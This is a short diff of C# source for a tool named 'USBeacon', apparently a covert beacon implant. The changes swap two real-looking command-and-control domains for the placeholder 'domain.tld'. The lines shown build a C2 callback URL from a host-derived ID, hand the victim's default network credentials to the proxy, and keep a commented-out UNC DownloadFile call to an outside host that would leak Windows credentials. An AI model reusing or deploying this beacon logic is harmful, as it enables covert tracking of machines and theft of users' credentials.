@@ -115,7 +115,7 @@ namespace USBeacon
             String hashid = GetId();   // Unique but repeatable ID of beacon built off of hostname
             UriBuilder c2 = new UriBuilder();   
             c2.Scheme = "http";
-            c2.Host = "update.awsbuckets.online";
+            c2.Host = "domain.tld";
             c2.Port = 80;
             c2.Path = resource + "/";
             c2.Path += hashid;
@@ -171,7 +171,7 @@ namespace USBeacon
                 if (client.Proxy != null)
                     client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                 String somefile = "bogus.pdf";
-                client.DownloadFile(somefile, @"\\healthybitsatwork.com\signin");
+                client.DownloadFile(somefile, @"\\domain.tld\signin");
             }*/
 
 
